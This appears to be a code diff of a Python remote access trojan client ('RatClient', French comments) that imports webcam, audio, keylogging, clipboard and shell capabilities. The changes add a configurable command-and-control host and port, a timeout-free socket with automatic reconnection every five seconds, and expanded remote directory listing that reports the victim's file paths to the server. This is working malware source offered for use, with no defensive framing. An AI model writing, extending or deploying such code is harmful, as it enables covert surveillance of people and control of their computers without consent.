@@ -29,6 +29,7 @@ from queue import Queue
 import cv2
 import pyaudio
 import wave
+import argparse
 
 # Imports spécifiques à Linux
 if platform.system() != 'Windows':
@@ -36,9 +37,9 @@ if platform.system() != 'Windows':
     import termios
 
 class RatClient:
-    def __init__(self):
-        self.server_host = '127.0.0.1'
-        self.server_port = 8080
+    def __init__(self, server_host='127.0.0.1', server_port=8080):
+        self.server_host = server_host
+        self.server_port = server_port
         self.socket = None
         self.connected = False
         self.screen_capture_thread = None
@@ -52,7 +53,21 @@ class RatClient:
         self.screenshot_interval = 100  # ms
         self.last_clipboard = ""
         self.keyboard_listener = None
-        self.current_path = os.path.expanduser("~")  # Commence dans le dossier utilisateur
+        
+        # Initialiser le chemin selon l'OS
+        self.os_type = platform.system()
+        if self.os_type == 'Windows':
+            # Pour Windows, utiliser le chemin de l'utilisateur actuel
+            self.current_path = os.path.expanduser("~")
+            # Obtenir le nom d'utilisateur pour le chemin
+            self.username = os.getlogin()
+            print(f"[DEBUG] Windows détecté - Utilisateur: {self.username}")
+            print(f"[DEBUG] Chemin initial: {self.current_path}")
+        else:
+            # Pour Linux/Unix
+            self.current_path = os.path.expanduser("~")
+            print(f"[DEBUG] Unix/Linux détecté - Chemin: {self.current_path}")
+        
         self.screen_capture_active = False
         self.screen_capture_interval = 1000  # 1 seconde par défaut
         self.shell_process = None
@@ -76,24 +91,51 @@ class RatClient:
     def connect(self):
         """Établit la connexion avec le serveur."""
         try:
+            print(f"Tentative de connexion à {self.server_host}:{self.server_port}...")
+            
+            # Créer le socket
             self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            # Enlever le timeout pour une connexion permanente
+            self.socket.settimeout(None)
+            
+            # Désactiver le Nagle's algorithm pour Windows
+            if platform.system() == 'Windows':
+                self.socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            
+            print("Socket créé, tentative de connexion...")
             self.socket.connect((self.server_host, self.server_port))
+            print("Connexion établie avec succès!")
+            
             self.connected = True
-            print("Connecté au serveur")
             
             # Démarrer le thread de réception
             self.receive_thread = threading.Thread(target=self.receive_loop)
             self.receive_thread.daemon = True
             self.receive_thread.start()
-            
-            # Démarrer le thread d'informations système
-            self.start_system_info_thread()
+            print("Thread de réception démarré")
             
             # Envoyer les informations système
             self.send_system_info()
+            print("Informations système envoyées")
+            
             return True
+            
+        except socket.timeout:
+            print("Délai d'attente dépassé lors de la connexion")
+            return False
+        except ConnectionRefusedError:
+            print("Connexion refusée. Vérifiez que le serveur est en cours d'exécution")
+            return False
+        except socket.gaierror as e:
+            print(f"Erreur de résolution d'adresse : {e}")
+            return False
         except Exception as e:
             print(f"Erreur de connexion : {e}")
+            if self.socket:
+                try:
+                    self.socket.close()
+                except:
+                    pass
             return False
 
     def start_system_info_thread(self):
@@ -136,30 +178,52 @@ class RatClient:
         """Boucle de réception des messages du serveur."""
         while self.connected:
             try:
+                # Pas de timeout pour la réception
                 size_bytes = self.socket.recv(8)
                 if not size_bytes:
+                    print("Connexion fermée par le serveur")
                     break
                     
                 size = int.from_bytes(size_bytes, byteorder='big')
                 data = b""
-                while len(data) < size:
-                    chunk = self.socket.recv(min(4096, size - len(data)))
-                    if not chunk:
-                        break
-                    data += chunk
                 
-                if not data:
+                # Lire les données par morceaux
+                while len(data) < size:
+                    try:
+                        chunk = self.socket.recv(min(4096, size - len(data)))
+                        if not chunk:
+                            print("Connexion fermée pendant la réception des données")
+                            break
+                        data += chunk
+                    except Exception as e:
+                        print(f"Erreur lors de la réception des données : {e}")
+                        break
+                
+                if not data or len(data) < size:
+                    print("Données incomplètes reçues")
                     break
                     
                 message = json.loads(data.decode())
                 self.handle_command(message)
                 
+            except json.JSONDecodeError as e:
+                print(f"Erreur de décodage JSON : {e}")
+                continue
             except Exception as e:
                 print(f"Erreur de réception : {e}")
                 break
         
         self.connected = False
         print("Déconnecté du serveur")
+        
+        # Tentative de reconnexion automatique
+        while not self.connected:
+            print("Tentative de reconnexion dans 5 secondes...")
+            time.sleep(5)
+            if self.connect():
+                print("Reconnexion réussie!")
+            else:
+                print("Échec de la reconnexion")
 
     def send_message(self, message):
         """Envoie un message au serveur."""
@@ -334,27 +398,112 @@ class RatClient:
     def list_directory(self, path):
         """Liste le contenu d'un répertoire."""
         try:
+            # Si le chemin est vide ou None, utiliser le chemin actuel
+            if not path:
+                path = self.current_path
+            
+            print(f"[DEBUG] Tentative de listage du répertoire: {path}")
+            
+            # Pour Windows, s'assurer que le chemin est valide
+            if self.os_type == 'Windows':
+                # Si le chemin commence par C:\home\slayz, le corriger
+                if path.startswith('C:\\home\\slayz'):
+                    path = f"C:\\Users\\{self.username}"
+                # Convertir les slashes en backslashes
+                path = path.replace('/', '\\')
+                # S'assurer que c'est un chemin absolu
+                if not os.path.isabs(path):
+                    path = os.path.join(f"C:\\Users\\{self.username}", path)
+            
+            # Convertir en chemin absolu
+            path = os.path.abspath(path)
+            print(f"[DEBUG] Chemin absolu final: {path}")
+            
+            # Vérifier si le chemin existe
+            if not os.path.exists(path):
+                print(f"[DEBUG] Le chemin {path} n'existe pas")
+                self.send_message({
+                    'type': 'command_response',
+                    'command': 'list_directory',
+                    'data': {
+                        'error': f"Le chemin {path} n'existe pas",
+                        'current_path': self.current_path,
+                        'entries': []
+                    }
+                })
+                return
+            
+            # Mettre à jour le chemin actuel si le nouveau chemin est valide
+            self.current_path = path
+            print(f"[DEBUG] Chemin actuel mis à jour: {self.current_path}")
+            
             entries = []
-            for item in os.listdir(path):
-                full_path = os.path.join(path, item)
-                try:
-                    stat = os.stat(full_path)
-                    entries.append({
-                        'name': item,
-                        'type': 'Directory' if os.path.isdir(full_path) else 'File',
-                        'size': f"{stat.st_size:,} bytes",
-                        'modified': datetime.fromtimestamp(stat.st_mtime).strftime('%Y-%m-%d %H:%M:%S')
-                    })
-                except Exception:
-                    continue
-                    
+            try:
+                # Lister les fichiers et dossiers
+                for item in os.listdir(path):
+                    try:
+                        full_path = os.path.join(path, item)
+                        stat_info = os.stat(full_path)
+                        
+                        # Déterminer le type
+                        if os.path.isdir(full_path):
+                            item_type = "Directory"
+                        else:
+                            item_type = "File"
+                        
+                        # Formater la taille
+                        size = stat_info.st_size
+                        if size < 1024:
+                            size_str = f"{size} B"
+                        elif size < 1024*1024:
+                            size_str = f"{size/1024:.1f} KB"
+                        else:
+                            size_str = f"{size/(1024*1024):.1f} MB"
+                        
+                        entry = {
+                            'name': item,
+                            'type': item_type,
+                            'size': size_str,
+                            'modified': datetime.fromtimestamp(stat_info.st_mtime).strftime('%Y-%m-%d %H:%M:%S'),
+                            'path': full_path
+                        }
+                        entries.append(entry)
+                        print(f"[DEBUG] Ajouté: {item} ({item_type})")
+                    except Exception as e:
+                        print(f"[DEBUG] Erreur pour {item}: {str(e)}")
+                        continue
+            except Exception as e:
+                print(f"[DEBUG] Erreur lors du listage: {str(e)}")
+            
+            # Trier les entrées (dossiers d'abord, puis par nom)
+            entries.sort(key=lambda x: (x['type'] != 'Directory', x['name'].lower()))
+            
+            print(f"[DEBUG] Nombre total d'entrées: {len(entries)}")
+            
+            # Envoyer la réponse avec les entrées dans un dictionnaire
+            response = {
+                'type': 'command_response',
+                'command': 'list_directory',
+                'data': {
+                    'entries': entries,
+                    'current_path': path
+                }
+            }
+            print(f"[DEBUG] Envoi de la réponse avec {len(entries)} entrées")
+            print(f"[DEBUG] Format de la réponse: {response}")
+            self.send_message(response)
+            
+        except Exception as e:
+            print(f"[DEBUG] Erreur globale: {str(e)}")
             self.send_message({
                 'type': 'command_response',
                 'command': 'list_directory',
-                'data': entries
+                'data': {
+                    'error': str(e),
+                    'current_path': self.current_path,
+                    'entries': []
+                }
             })
-        except Exception as e:
-            print(f"Erreur lors de la liste du répertoire : {e}")
 
     def create_directory(self, path):
         """Crée un nouveau répertoire."""
@@ -953,11 +1102,24 @@ class RatClient:
             })
 
 def main():
-    client = RatClient()
+    # Créer le parser d'arguments
+    parser = argparse.ArgumentParser(description='Client RAT')
+    parser.add_argument('--host', type=str, default='127.0.0.1', help='Adresse IP du serveur')
+    parser.add_argument('--port', type=int, default=3333, help='Port du serveur')
+    
+    # Parser les arguments
+    args = parser.parse_args()
+    
+    # Créer et démarrer le client avec les arguments
+    client = RatClient(server_host=args.host, server_port=args.port)
     try:
-        client.connect()
-        while client.connected:
-            time.sleep(1)
+        print(f"Tentative de connexion à {args.host}:{args.port}...")
+        if client.connect():
+            print("Connecté avec succès!")
+            while client.connected:
+                time.sleep(1)
+        else:
+            print("Échec de la connexion")
     except KeyboardInterrupt:
         print("\nArrêt du client...")
     finally:
